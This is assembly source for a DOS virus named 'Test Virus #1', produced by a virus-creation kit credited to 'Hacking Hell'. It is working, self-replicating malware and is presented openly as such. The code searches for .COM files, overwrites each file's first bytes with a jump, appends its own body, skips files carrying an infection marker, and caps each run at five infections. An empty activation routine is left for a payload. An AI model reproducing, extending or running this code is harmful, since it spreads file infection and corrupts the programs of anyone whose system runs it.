

; Virus-Name:                      'Test Virus #1'
; Virus-ID:                        '[T1]'
; Author:                          'Hacking Hell'
; Author ID:                       '[HH]'
; Creator:                         '[IE-VCC v0.19á]'
; Creator ID:                      '[IE]'
          
.Model Tiny                        ; Every seen a .Model Huge in a virus?!?
.Radix 16                          ; Standard Hexadecimal
.Code                              ; Code segment
          
Dummy:                             ; This is the fake host (dummy)
          db      0E9,03,00        ; JuMP to S_O_V (Start Of Virus)
          db      'C'              ; Already infected marker
          Int     20               ; Exit from fake host
          
S_O_V:                             ; Start Of Virus
          
          Call     GetDeltaOfs     ; Get the delta offset
GetDeltaOfs:
          Pop      BP              ; BP is equal to IP
          Sub      BP,Offset GetDeltaOfs  ; Now BP is really initiated!
          
CodeSt:                            ; This is where the virus really starts
          Lea     SI,[Offset Original_Bytes+BP]  ; Source pointer for orig. bytes
          Mov     DI,0100          ; Destination pointer
          Movsw
          Movsw
          
          Push    CS               ; CS <==> DS
          Pop     DS
          
          Lea     DX,[E_O_V+BP]    ; Set DTA address to End Of Virus
          Mov     AH,1A
          Int     21
Spread:                            ; Here is the file-search routine
          Mov     Byte Ptr[Infections+BP],0  ; Reset infection counter
Spraed:                            ; This label is used by Traverse
          Mov     AH,4E            ; Find first matching file
          Lea     DX, [Offset FileSpec+BP]
          
FindNext:                          ; Here will be the INT 21 call
          Cmp     Byte Ptr [Infections+BP],5  ; Check if all infections are done
          Je      Reset_DTA        ; Yes? Reset the DTA and call activation routines
          
          Int     21
          Jc      Reset_DTA        ; No more files, reset DTA and exit
          Call    InfectFile       ; Call to the infection routine
          
NextFile:                          ; Set AH to findnext
          Mov     AH,4F
          Jmp     FindNext
          
Reset_DTA:                         ; Reset the Disk Transfer Address
          Mov     AH,1A            ; Set DTA Address
          Mov     DX,80            ; to 80Hex
          Int     21
          
          Call    Activations      ; Call the activation Routine(s)
          
          Mov     DI,0100          ; Give control to original program
          Push    DI               ; Simulate a call
          Ret
          
Activations:                       ; Place your activation Routines here!
          
          Ret
VirusName:                         ; Name Of the virus
          DB      'Test Virus #1',0
AuthorName:                        ; Name Of the author
          DB      'Hacking Hell',0
Creator:                           ; Name of the creator
          DB      'I-EAS Virus Creation Centre v0.19á',0
VirusID:                           ; ID of the virus
          DB      '[T1]',0
AuthorID:                          ; ID of the author
          DB      '[HH]',0
CreatorID:                         ; ID of the creator
          DB      '[IE-VCC v0.19á]',0
          
Original_Bytes:                    ; Original bytes will be stored here
          DB      90,90,90,90      ; Fake host: 4 NOPs
Jump_Table:                        ; This is the jump table that will be put
          DB      0E9,03,00,'C'    ;  in the beginning of the victim
Infections:                        ; Infection counter
          DB      0
FileSpec:                          ; Filefind Spec
          DB      '*.COM',0        ; Filefind Spec
          
InfectFile:                        ; The Infection Routine:
          Lea     DX,[E_O_V+1E+BP]  ; Open the victim
          Mov     AX,3D02
          Int     21
          Jnc     InfectIt         ; If file opened OK infect it!
          Ret
          
InfectIt:                          ; The real infection Routine
          Xchg    BX,AX            ; Copy handle in BX
          
          Mov     CX,0004          ;Read first 4 bytes for check
          Mov     AH,3F            ; if already infected!
          Lea     DX,[Original_Bytes+BP]
          Int     21
          
          Cmp    Byte Ptr [Original_Bytes+3+BP],'C'  ; Already Infected
          Jz     Shut_File         ; Close & Next file
          
          Mov     AX,4202          ; Goto E_O_F
          Sub     CX,CX            ; 2 byte version of Mov CX,0!!
          Cwd                      ; 1 Byte version of Mov DX,0!!
          Int     21
          
          Sub     AX,0003h         ; Initialize Jump Table
          Mov     Word Ptr [Jump_Table+1+BP],AX
          
          Mov     AX,4200          ; Goto S_O_F
          Sub     CX,CX
          Cwd
          Int     21
          
          Mov     AX,4000          ; Write jump table over the original
          Mov     CX,0004          ;  four bytes
          Lea     DX,[Jump_Table+BP]
          Int     21
          Inc     Byte Ptr [Infections+BP]  ; Increase infection count
          
          Mov     AX,4202          ; Goto E_O_F
          Sub     CX,CX            ; 2 byte version of Mov CX,0!!
          Cwd                      ; 1 Byte version of Mov DX,0!!
          Int     21
          
          Mov     AH,40            ; Implend virus code in the victim
          Mov     CX,(E_O_V - S_O_V)  ; Calculate Size
          Lea     DX,[S_O_V+BP]    ; Starting location
          Int     21
          
Shut_File:                         ; Close the victim file
          Mov     AH,3E
          Int     21
          Ret                      ; End of infection routine
          
E_O_V:                             ; End Of Virus label
          End     Dummy            ; Set starting IP to the fake host
          
; This virus has been produced by IE-Virus Creation Centre v0.19á
; Some specific information about this creation: 
;  + It an appending .COM file infector

</==>